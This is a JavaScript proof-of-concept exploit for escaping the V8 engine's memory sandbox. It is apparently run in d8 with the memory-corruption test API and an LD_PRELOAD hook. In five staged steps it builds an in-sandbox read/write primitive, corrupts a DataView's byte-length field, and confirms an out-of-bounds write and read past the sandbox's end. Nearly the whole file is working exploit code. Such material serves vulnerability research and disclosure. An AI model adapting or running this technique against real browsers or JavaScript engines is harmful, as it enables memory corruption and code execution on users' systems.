'use strict';
// GDB-free sandbox escape PoC — run via heap_escape_ldpreload.sh
// Requires LD_PRELOAD=mmap_hook.so to map a page at SB_END before V8 starts.

function hex(v) {
  if (typeof v === 'bigint') return '0x' + v.toString(16).padStart(12, '0');
  return '0x' + (v >>> 0).toString(16).padStart(8, '0');
}
function banner(s) { print('\n━━━ ' + s + ' ━━━'); }

if (typeof Sandbox === 'undefined') {
  print('[-] Need: --expose-memory-corruption-api --allow-natives-syntax'); quit(1);
}

// Stage 1: in-sandbox 4 GB R/W primitive
const sv    = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const r32   = a => sv.getUint32(Number(a), true);
const w32   = (a, v) => sv.setUint32(Number(a), v >>> 0, true);
const SB_BASE = BigInt(Sandbox.base);
const SB_END  = SB_BASE + BigInt(Sandbox.byteLength);

banner('SANDBOX VA');
print('  SB_BASE = ' + hex(SB_BASE));
print('  SB_END  = ' + hex(SB_END));

// Stage 2: MemoryView whose backing_store = SB_END − 4 GB
banner('STAGE 2');
const mv_end    = new Sandbox.MemoryView(Sandbox.byteLength - 0x100000000, 0x100000000);
const mv_end_dv = new DataView(mv_end);
const dvAddr    = BigInt(Sandbox.getAddressOf(mv_end_dv));
print('  backing_store = SB_END − 4 GB = ' + hex(SB_END - 0x100000000n));

// Stage 3: inflate JSDataView.raw_byte_length (+0x24, field×8=byteLength) to ~34 GB
banner('STAGE 3 — inflate');
w32(dvAddr + 0x24n, 0xFFFFFFFF);
const bl = mv_end_dv.byteLength;
print('  DataView.byteLength = ' + bl + ' (0x' + bl.toString(16) + ')');
if (bl < 0x400000000n) { print('[-] inflation failed'); quit(1); }
print('  Inflation ✓');

// Stage 4: OOB write to SB_END + 4
// offset 0x100000004 = 4 GB + 4
// address = (SB_END − 4 GB) + (4 GB + 4) = SB_END + 4
banner('STAGE 4 — OOB write');
const OFFSET = 0x100000004;
const target = SB_END + 4n;
print('  Writing 0xDEADC0DE → ' + hex(target) + '  (SB_END + 4)');
mv_end_dv.setUint32(OFFSET, 0xDEADC0DE, true);
print('  Write completed without crash ✓');

// Stage 5: read back to confirm
banner('STAGE 5 — read back');
const v = mv_end_dv.getUint32(OFFSET, true);
print('  Read back: ' + hex(v));
if (v === 0xDEADC0DE) {
  print('\n  ✓ READ/WRITE OUTSIDE SANDBOX VA CONFIRMED');
  print('  Address ' + hex(target) + ' outside [' + hex(SB_BASE) + ', ' + hex(SB_END) + ')');
} else {
  print('  ✗ unexpected value — mmap_hook may not have fired');
}
